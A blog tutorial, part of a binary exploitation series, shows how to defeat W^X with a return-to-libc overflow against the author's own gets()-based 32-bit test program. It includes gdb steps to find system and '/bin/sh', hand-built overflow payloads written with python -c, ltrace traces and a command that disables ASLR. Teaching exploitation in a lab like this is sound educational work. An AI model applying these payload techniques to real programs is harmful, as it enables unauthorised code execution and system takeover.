---
layout: post
title: Defeating Write XOR Execute!
categories: Reverse Engineering and Binary Exploitation Series
comments: true
---

Hey fellow pwners!

In the [previous post](/reverse/engineering/and/binary/exploitation/series/2018/12/28/security-measures-by-os.html), we discussed a few security techniques that the Operating System uses to mitigate attacks. 

Starting from this post, the next few posts will be about exploit methods which aim at defeating each of the security techniques we discussed in the previous post. 

As the title of the post suggests, we will be focusing on defeating the amazing **W XOR X** security technique.

The complete post is written with ASLR and StackGaurd **disabled**. It will be easy to demonstrate this exploit method. 

This is the 14th post in this series. So, create a directory with name **post_14** inside **rev_eng_series**. 

## Overview 

To understand the exploit methods discussed in this post, you should have understood W XOR X in detail, Function Call mechanism. In case if you are not familiar these, you can read through [post1](/reverse/engineering/and/binary/exploitation/series/2018/12/28/security-measures-by-os.html) and [post2](/reverse/engineering/and/binary/exploitation/series/2018/09/22/program-execution-internals-part-2.html) to get an idea. 

The problem at hand is, code injection exploits fail badly if W XOR X is enabled. Our end goal is a shell! So, how do we get this? 
To get a shell, we have to design an exploit method which will bypass this technique. 

Let us disable ASLR before we go ahead. 

    rev_eng_series/post_14# echo 0 > /proc/sys/kernel/randomize_va_space


Let us get started!


## What do we have? 

Let us see what are the resources at hand: 

1. A BOF which we need to exploit. Given an address, we can use the BOF and execute code at that address. 

2. We have the stack if we have to store some information related to the exploit. Of course not shellcode :P . 

3. One important resource we have is the **libc**. The complete **libc** is mapped into the process's address space. Can we use some function in libc to get a shell? Let us see. 


## Different ways to get a shell

Normally, there are many ways to get a shell. We have used **execve** to get a shell. There is one more library function called **system** which will simply run any command we give. So, **system("/bin/sh")** should give the shell. 

If you have read [this](/reverse/engineering/and/binary/exploitation/series/2018/10/08/buffer-overflow-vulnerability-02.html) post, I had told that there would be no code in a software which will **help** attackers get control of the system. But what if I told you that our beloved, useful **libc** can be used in an evil manner to get a shell. 

So, that is the idea. We have the BOF, let us use one of the above libc functions and get the god access. 

Let us get to it!

## Program

Let us use the following program for this post: 

    rev_eng_series/post_14$ cat defeat.c
    #include<stdio.h>

    void func() {

        char buffer[100];
        gets(buffer);

    }

    int main() {

        printf("Before calling func\n");
        func();
        printf("After calling func\n");

        return 0;
    }

    rev_eng_series/post_14$ gcc defeat.c -o defeat -m32 -fno-stack-protector
    defeat.c: In function ‘func’:
    defeat.c:6:2: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
    gets(buffer);
    ^
    /tmp/ccPIQEfQ.o: In function `func':
    defeat.c:(.text+0xe): warning: the `gets' function is dangerous and should not be used.

Let us work on the **32-bit** executable compiled without StackGaurd. Note that the process will have a non-executable stack because we didn't use the **-z execstack** option. 

Go through the program. It is pretty straight forward. There is a **gets** which makes the programm vulnerable. We have to exploit it and get the shell!

## Designing the Exploit

Let us first think how we are going to do it. How do we execute **system("/bin/sh")** using the BOF. 

1. We can use the BOF for Hijack the Control Flow. 

2. As libc is mapped into the address space of the process, **system** will have an address. Find it's Address. 

3. We can overwrite the function's ReturnAddress with system's Address. This way, **system** will be called. 

4. It is not enough if **system** function is called. It has an argument - the Address of "/bin/sh" . We have to see how we can **pass** this argument to **system** function. So, we have to find **/bin/sh** in the address space. In case we don't find it, we will inject it in the buffer and use it. 

We now have the skeleton of the exploit. Let us get into the specifics of each of the steps. 


### Step2: Finding system's address

We know for sure that **system** is present in **libc**. 

This is the plan to find it's Address. 

1. Run the program using gdb. Find system's address. 

2. Get the PID and open up the maps file. Get the Starting Address of **libc.so**'s executable part. 

3. Find the difference between the Starting Address of libc.so and system's address. This will give the offset of system from the beginning of libc. 

4. Run the program normally. Open up the corresponding **/proc/PID/maps** and note the Starting Address of libc.so . 

5. Add the offset found out in step3 to the Starting Address found in step4. This is **system**'s Address. 

6. As ASLR is disabled, this address won't change. But note that even if ASLR is disabled, addresses might change - but it won't be that random. So, we have to take care of this. 

Now, we have a plan to find **system**'s address. Let us get it!

1. Finding the offset of system function from the beginning of libc.  

        rev_eng_series/post_14$ gdb -q defeat
        Reading symbols from defeat...(no debugging symbols found)...done.
        gdb-peda$ b func
        Breakpoint 1 at 0x8048441
        gdb-peda$ run

    * The program breaks at func. 

    * Let us now find out the address of **system**. 

            gdb-peda$ print system
            $1 = {<text variable, no debug info>} 0xf7e2fda0 <system>
            gdb-peda$ 

    * **system**'s address is **0xf7e2fda0**. 

    * Let us open up the **/proc/PID/maps** file and get the Starting Address of libc.so . 

            gdb-peda$ getpid
            21867

    * The following is the maps file: 

            rev_eng_series/post_14$ cat /proc/21867/maps
            08048000-08049000 r-xp 00000000 08:02 5507267                            /home/adwi/ALL/rev_eng_series/post_14/defeat
            08049000-0804a000 r--p 00000000 08:02 5507267                            /home/adwi/ALL/rev_eng_series/post_14/defeat
            0804a000-0804b000 rw-p 00001000 08:02 5507267                            /home/adwi/ALL/rev_eng_series/post_14/defeat
            0804b000-0806c000 rw-p 00000000 00:00 0                                  [heap]
            f7df4000-f7df5000 rw-p 00000000 00:00 0 
            f7df5000-f7fa5000 r-xp 00000000 08:02 25691233                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa5000-f7fa7000 r--p 001af000 08:02 25691233                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa7000-f7fa8000 rw-p 001b1000 08:02 25691233                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa8000-f7fab000 rw-p 00000000 00:00 0 
            f7fd3000-f7fd4000 rw-p 00000000 00:00 0 
            f7fd4000-f7fd7000 r--p 00000000 00:00 0                                  [vvar]
            f7fd7000-f7fd9000 r-xp 00000000 00:00 0                                  [vdso]
            f7fd9000-f7ffc000 r-xp 00000000 08:02 25691229                           /lib/i386-linux-gnu/ld-2.23.so
            f7ffc000-f7ffd000 r--p 00022000 08:02 25691229                           /lib/i386-linux-gnu/ld-2.23.so
            f7ffd000-f7ffe000 rw-p 00023000 08:02 25691229                           /lib/i386-linux-gnu/ld-2.23.so
            fffdc000-ffffe000 rw-p 00000000 00:00 0                                  [stack]

    * The Starting Address of executable part(**r-x**) of libc.so is **f7df5000**. Note that all these addresses can be different for you. But the steps are the same. 

    * Let us find the offset: 

            rev_eng_series/post_14$ python
            Python 2.7.12 (default, Nov 12 2018, 14:36:49) 
            [GCC 5.4.0 20160609] on linux2
            Type "help", "copyright", "credits" or "license" for more information.
            >>> 0xf7df5000 - 0xf7e2fda0
            -241056

    * The **offset** = 241056 bytes. 

    * I think the most important point to note is that this offset might be different depending and I think it depends on **version** of libc. My machine's libc version is **2.23**. So, calculate the offset for your libc version. 

    * The outcome is **system_offset = 241056 bytes**. 

### Finding "/bin/sh"!

Finding "/bin/sh" is very similar to finding system's address. 

1. Open up the program in gdb and use the **find** command to find "/bin/sh". 

        gdb-peda$ find "/bin/sh"
        Searching for '/bin/sh' in: None ranges
        Found 1 results, display max 1 items:
        libc : 0xf7f50a0b ("/bin/sh")

        gdb-peda$ find "/bin/bash"
        Searching for '/bin/bash' in: None ranges
        Found 1 results, display max 1 items:
        [stack] : 0xffffd07a ("/bin/bash")

    * You can see we have got it! We have both "/bin/sh" and "/bin/bash". Let us use "/bin/sh" itself. You can use either of them.

    * Address of "/bin/sh" = **0xf7f50a0b**. Note that it is found in **libc**. 

    * Let us find in which address space this is found. Let us go back to the maps file. 

            f7df5000-f7fa5000 r-xp 00000000 08:02 25691233                           /lib/i386-linux-gnu/libc-2.23.so

    * It is found in the executable space of libc.so . Let us find the offset. 

            >>> 0xf7df5000 - 0xf7f50a0b
            -1423883

    * So, **binsh_offset = 1423883 bytes**. 


### Find addresses of system and /bin/sh

In this step, let us find the addresses of system and "/bin/sh" in the process when it is run normally. 

1. Let us run the program normally and look at it's maps file. 

        rev_eng_series/post_14$ ./defeat 
        Before calling func

    * Find the PID using **ps -e**. PID of my process is 23602. Let us look at maps. 

            rev_eng_series/post_14$ cat /proc/23602/maps
            08048000-08049000 r-xp 00000000 08:02 5507267                            /home/adwi/ALL/rev_eng_series/post_14/defeat
            08049000-0804a000 r--p 00000000 08:02 5507267                            /home/adwi/ALL/rev_eng_series/post_14/defeat
            0804a000-0804b000 rw-p 00001000 08:02 5507267                            /home/adwi/ALL/rev_eng_series/post_14/defeat
            0804b000-0806c000 rw-p 00000000 00:00 0                                  [heap]
            f7df4000-f7df5000 rw-p 00000000 00:00 0 
            f7df5000-f7fa5000 r-xp 00000000 08:02 25691233                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa5000-f7fa7000 r--p 001af000 08:02 25691233                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa7000-f7fa8000 rw-p 001b1000 08:02 25691233                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa8000-f7fab000 rw-p 00000000 00:00 0 
            f7fd3000-f7fd4000 rw-p 00000000 00:00 0 
            f7fd4000-f7fd7000 r--p 00000000 00:00 0                                  [vvar]
            f7fd7000-f7fd9000 r-xp 00000000 00:00 0                                  [vdso]
            f7fd9000-f7ffc000 r-xp 00000000 08:02 25691229                           /lib/i386-linux-gnu/ld-2.23.so
            f7ffc000-f7ffd000 r--p 00022000 08:02 25691229                           /lib/i386-linux-gnu/ld-2.23.so
            f7ffd000-f7ffe000 rw-p 00023000 08:02 25691229                           /lib/i386-linux-gnu/ld-2.23.so
            fffdc000-ffffe000 rw-p 00000000 00:00 0                                  [stack]

    * Find **system**'s address:  
    
            ->system_address = starting_address + system_offset
            ->system_address = 0xf7df5000 + 241056
            ->system_address = 0xf7e2fda0
        
        * **system_address = 0xf7e2fda0**. 

    * Find **/bin/sh**'s address: 

            ->binsh_address = starting_address + binsh_offset
            ->binsh_address = 0xf7df5000 + 1423883
            ->binsh_adresss = 0xf7f50a0b
        
        * **binsh_address = 0xf7f50a0b**. 

    * Note that when you run the program multiple times, these addresses might change. So, you will have to repeat the above step probably multiple times if the address changes. 

    * Finally, **system_address = 0xf7e2fda0** and **binsh_address = 0xf7f50a0b** . 


### How do we "call" system? 

We have a BOF. We can overwrite the ReturnAddress with the system_address. The control will just jump to **system** function but nothing will happen. It has an argument - the **binsh_address**. 

What we have is a **Return back to middle of another function** but what we want is **Call a new function**. Note the difference. When you are returning back to a function, you just execute the **ret** instruction - jump to ReturnAddress and pop ReturnAddress off the stack. But calling a function is different. For a function to be called, arguments are first pushed into the stack, the **call** is executed. The ReturnAddress is pushed and control is given to the first instruction of the function. A StackFrame is constructed and only then the function execution starts. 

So, there is a lot of difference between Returning back to middle of another function and Calling a new function. Look at the followin diagrams: 

                LowerAddress
                                  
    |    Address    |                           |               |       
    |               |                           |               |
    |               |                           |               |
    |               |           ret             |               |
    |               |   ------------------->    |               |   + Control goes to instruction at Address
    |               |                           |               |
    |               |                           |               |
    |               |                           |               |
    |               |                           |               |

      StackDiagram1                               StackDiagram2

        
        Return Back to middle of another function(diagram with respect to callee function) - Scenario1


                LowerAddress
 
    |     Argument3     |                       |  NewReturnAddress |                    
    |     Argument2     |                       |     Argument3     |                           
    |     Argument1     |                       |     Argument2     |                           
    |     Argument0     |      call Function    |     Argument1     |        
    |                   |  ----------------->   |     Argument0     |   --> Now, Function gets executed. 
    |                   |                       |                   |                           
    |                   |                       |                   |                           
    |                   |                       |                   |                           
    |                   |                       |                   |                           
    
      StackDiagram3                           StackDiagram4                             


                    Calling a new function (diagram with respect to callee function) - Scenario2


What we have is Scenario1. The plan is the **Address** in StackDiagram1 is **system_address**. This will make sure control is transfered to **system** function. Suppose control is transfered to **system**. With respect to **system**, the stack looks like StackDiagram2. It is empty. It has nothing. For any Function to get executed properly, it's StackFrame should look like in StackDiagram4. 

So, we have to convert StackDiagram2 to StackDiagram4. How do we do it? We just **construct** it. 

We will construct a **fake StackFrame** which will give **system** an illusion that it is being executed normally. But the reality is we are using Control Flow Hijacking to execute **system** - not normal. 

So, the stack should look like this: 

                    LowerAddress

    |   system_address  |                       |  NewReturnAddress |
    |  NewReturnAddress |          ret          |      Argument0    |
    |     Argument0     |   ---------------->   |                   |      + Control is transferred to system function. 
    |                   |                       |                   |
    |                   |                       |                   |


The ReturnAddress of vulnerable function(**func**) is overwritten by **system_address**. The job doesn't end at overwriting there. We have to write NewReturnAddress and Argument0 next to **system_address**. 

This view of stack of **func** might help:  

    <Buffer - 100 bytes><Padding - 8 bytes><Old ebp - 4 bytes><ReturnAddress - 4 bytes>

This has to converted to this with the help of gets. 

    <          'a' - 108 bytes            ><  'b' - 4 bytes  ><system_address -4 bytes><NewReturnAddress - 4 bytes><binsh_address>


Once we are done with this, we have successfully converted the "Returning back to a function" stack to "Calling a new function" Stack. 


Now that we have a plan, let us execute it. 


### Craft the payload

We know how the payload should look like. It should look like this:

    <          'a' - 108 bytes            ><  'b' - 4 bytes  ><system_address -4 bytes><NewReturnAddress - 4 bytes><binsh_address>

One thing to think about is, where will the **system** function return control back to? It was not actually called from any function. It was an illusion. But **system** is innocent and doesn't know that. 

For now, let us give NewReturnAddress = 'cccc'. 

This is the payload: 

    rev_eng_series/post_14$ python -c "print 'a' * 108 + 'b' * 4 + '\xa0\xfd\xe2\xf7' + 'c' * 4 + '\x0b\x0a\xf5\xf7'" > exploit.txt

Now, **exploit.txt** has the exploit payload. 

Only thing to do is run the vulnerable program again and inject this payload. 

### Exploit it!

Let us first open the program in gdb and see if we can get the shell or not. 

    rev_eng_series/post_14$ gdb -q defeat
    Reading symbols from defeat...(no debugging symbols found)...done.
    gdb-peda$ run < exploit.txt 
    Starting program: /home/adwi/ALL/rev_eng_series/post_14/defeat < exploit.txt
    Before calling func
    [New process 31425]
    process 31425 is executing new program: /bin/dash
    warning: the debug information found in "/lib64/ld-2.23.so" does not match "/lib64/ld-linux-x86-64.so.2" (CRC mismatch).

    [Inferior 2 (process 31425) exited normally]
    Warning: not running or target is remote
    gdb-peda$ 

Bingo! We got the shell. It says "executing new program: /bin/dash" . This is a success! There are 2 strange things. First is that we should have got a working shell here. We got to know that the shell program is run and then it got terminated. We have to see why this happened. Other thing is Return Address of **system** is **0x63636363**. So, once system returns, it returns to the code at 0x63636363 which will mostly end in a Seg Fault. But we didn't get any SegFault. The program peacefully exited. 

Now, that I observe the payload, the binsh_address = 0xf7f50a0b has a **newline / 0x0a** character in it. So, the  way gets works is it will simply take in input till a newline character or End-Of-File is encountered. So, as per this, gets should not have taken the complete address of binsh_address as input, but there we got a shell. 

Looking at this, I am almost convinced that our exploit will not work properly. I am actually surprised that we got a shell using gdb. I think the gdb is intervening. Because gets will not take one a newline / EOF is encountered. If it is taking in, then there is something fishy. 

Let us discuss about this later. Let us now focus on the exploit. Let us run the program normally. This is what I got. 

    rev_eng_series/post_14$ ./defeat < exploit.txt 
    Before calling func
    Segmentation fault (core dumped)

There is a tool called **ltrace** which will print out all the calls made to library functions. Using this, we will know if **system** actually got called or not. 

    rev_eng_series/post_14$ ltrace ./defeat < exploit.txt 
    __libc_start_main(0x8048453, 1, 0xffffcd54, 0x80484a0 <unfinished ...>
    puts("Before calling func"Before calling func
    )                      = 20
    gets(0xffffcc2c, 0x804b008, 20, 0xf7e5f3ac)      = 0xffffcc2c
    --- SIGCHLD (Child exited) ---
    --- SIGSEGV (Segmentation fault) ---
    +++ killed by SIGSEGV +++

Either it was not called or it was not called properly - it didn't have a proper argument. That is why the program SegFaulted by dereferencing probably an invalid address. 

Instead of taking "/bin/sh", let us take "/bin/bash" which is present in the address space. 

Find the address of "/bin/bash" using **find** command in gdb and put the payload in exploit.txt . 

    gdb-peda$ find "/bin/bash"
    Searching for '/bin/bash' in: None ranges
    Found 1 results, display max 1 items:
    [stack] : 0xffffd07a ("/bin/bash")

I got an address here. This "/bin/bash" is present on the stack. It is one of the environment variables. 

Use the **ltrace** to see what is happening. 

    rev_eng_series/post_14$ python -c "print 'a' * 108 + 'b' * 4 + '\xa0\xfd\xe2\xf7' + 'c' * 4 + '\x7a\xd0\xff\xff'" > exploit.txt
    rev_eng_series/post_14$ ltrace ./defeat < exploit.txt 
    __libc_start_main(0x8048453, 1, 0xffffcd54, 0x80484a0 <unfinished ...>
    puts("Before calling func"Before calling func
    )                      = 20
    gets(0xffffcc2c, 0x804b008, 20, 0xf7e5f3ac)      = 0xffffcc2c
    sh: 1: 56color: not found
    --- SIGCHLD (Child exited) ---
    --- SIGSEGV (Segmentation fault) ---
    +++ killed by SIGSEGV +++

Ooh! **system** is executed successfully. The address of "/bin/bash" is changed. We can use the **env** command to get the list of environment variables. 

    rev_eng_series/post_14$ env
    XDG_VTNR=7
    XDG_SESSION_ID=c2
    rvm_bin_path=/home/adwi/.rvm/bin
    XDG_GREETER_DATA_DIR=/var/lib/lightdm-data/adwi
    CLUTTER_IM_MODULE=xim
    SESSION=ubuntu
    GEM_HOME=/home/adwi/.rvm/gems/ruby-2.4.1
    GPG_AGENT_INFO=/home/adwi/.gnupg/S.gpg-agent:0:1
    TERM=xterm-256color
    VTE_VERSION=4205
    XDG_MENU_PREFIX=gnome-
    SHELL=/bin/bash
    IRBRC=/home/adwi/.rvm/rubies/ruby-2.4.1/.irbrc
    QT_LINUX_ACCESSIBILITY_ALWAYS_ON=1
    SEED_ENV=1234
    WINDOWID=92293204
    OLDPWD=/home/adwi/ALL/personal_website/adwait1-g.github.io
    UPSTART_SESSION=unix:abstract=/com/ubuntu/upstart-session/1000/2908
    GNOME_KEYRING_CONTROL=
    MY_RUBY_HOME=/home/adwi/.rvm/rubies/ruby-2.4.1
    GTK_MODULES=gail:atk-bridge:unity-gtk-module
    USER=adwi
    LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
    QT_ACCESSIBILITY=1
    _system_type=Linux
    UNITY_HAS_3D_SUPPORT=true
    XDG_SESSION_PATH=/org/freedesktop/DisplayManager/Session0
    rvm_path=/home/adwi/.rvm
    XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0
    SSH_AUTH_SOCK=/run/user/1000/keyring/ssh
    DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path
    SESSION_MANAGER=local/adwi:@/tmp/.ICE-unix/3442,unix/adwi:/tmp/.ICE-unix/3442
    XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/usr/share/upstart/xdg:/etc/xdg
    UNITY_DEFAULT_PROFILE=unity
    rvm_prefix=/home/adwi
    DESKTOP_SESSION=ubuntu
    PATH=/home/adwi/.cargo/bin:/home/adwi/.rvm/gems/ruby-2.4.1/bin:/home/adwi/.rvm/gems/ruby-2.4.1@global/bin:/home/adwi/.rvm/rubies/ruby-2.4.1/bin:/home/adwi/.cargo/bin:/home/adwi/bin:/home/adwi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/home/adwi/.rvm/bin:/home/adwi/android_studio_bin/:.:/home/adwi/.rvm/bin:/home/adwi/.cargo/bin
    QT_IM_MODULE=ibus
    QT_QPA_PLATFORMTHEME=appmenu-qt5
    XDG_SESSION_TYPE=x11
    PWD=/home/adwi/ALL/rev_eng_series/post_14
    JOB=unity-settings-daemon
    XMODIFIERS=@im=ibus
    GNOME_KEYRING_PID=
    LANG=en_IN
    GDM_LANG=en_US
    MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path
    _system_arch=x86_64
    COMPIZ_CONFIG_PROFILE=ubuntu
    IM_CONFIG_PHASE=1
    _system_version=16.04
    GDMSESSION=ubuntu
    rvm_version=1.29.4 (master)
    SESSIONTYPE=gnome-session
    GTK2_MODULES=overlay-scrollbar
    SHLVL=1
    HOME=/home/adwi
    XDG_SEAT=seat0
    LANGUAGE=en_IN:en
    GNOME_DESKTOP_SESSION_ID=this-is-deprecated
    UPSTART_INSTANCE=
    UPSTART_EVENTS=xsession started
    XDG_SESSION_DESKTOP=ubuntu
    LOGNAME=adwi
    COMPIZ_BIN_PATH=/usr/bin/
    GEM_PATH=/home/adwi/.rvm/gems/ruby-2.4.1:/home/adwi/.rvm/gems/ruby-2.4.1@global
    DBUS_SESSION_BUS_ADDRESS=unix:abstract=/tmp/dbus-HSPQIdEgqW
    XDG_DATA_DIRS=/usr/share/ubuntu:/usr/share/gnome:/usr/local/share:/usr/share:/var/lib/snapd/desktop
    QT4_IM_MODULE=xim
    LESSOPEN=| /usr/bin/lesspipe %s
    INSTANCE=
    UPSTART_JOB=unity7
    XDG_RUNTIME_DIR=/run/user/1000
    DISPLAY=:0
    XDG_CURRENT_DESKTOP=Unity
    GTK_IM_MODULE=ibus
    RUBY_VERSION=ruby-2.4.1
    LESSCLOSE=/usr/bin/lesspipe %s %s
    _system_name=Ubuntu
    XAUTHORITY=/home/adwi/.Xauthority
    _=/usr/bin/env


The following is a part of the above output: 

    TERM=xterm-256color
    VTE_VERSION=4205
    XDG_MENU_PREFIX=gnome-
    SHELL=/bin/bash

So, our exploit is running **56color**. It should run **/bin/bash**. We just have to change the address accordingly. Add the number of characters between first character of 56color and first character of /bin/bash. 

    rev_eng_series/post_14$ python -c "print 'a' * 108 + 'b' * 4 + '\xa0\xfd\xe2\xf7' + 'c' * 4 + '\xaf\xd0\xff\xff'" > exploit.txt

    rev_eng_series/post_14$ ltrace ./defeat < exploit.txt __libc_start_main(0x8048453, 1, 0xffffcd54, 0x80484a0 <unfinished ...>
    puts("Before calling func"Before calling func
    )                      = 20
    gets(0xffffcc2c, 0x804b008, 20, 0xf7e5f3ac)      = 0xffffcc2c
    sh: 1: =/bin/bash: not found
    --- SIGCHLD (Child exited) ---
    --- SIGSEGV (Segmentation fault) ---
    +++ killed by SIGSEGV +++

We have to remove that **=**. So, the following is the proper payload. 

    rev_eng_series/post_14$ python -c "print 'a' * 108 + 'b' * 4 + '\xa0\xfd\xe2\xf7' + 'c' * 4 + '\xb0\xd0\xff\xff'" > exploit.txt
    rev_eng_series/post_14$ 




At this point, I don't what the problem is. I am sure that **/bin/bash** is executed. But it is **exiting** and the program is SegFaulting. 

You may have got the exploit right when we tried with "/bin/sh" itself. But unfortunately, that is not the case with me. Because of the newline character, I had to repeat the process with "/bin/bash". 













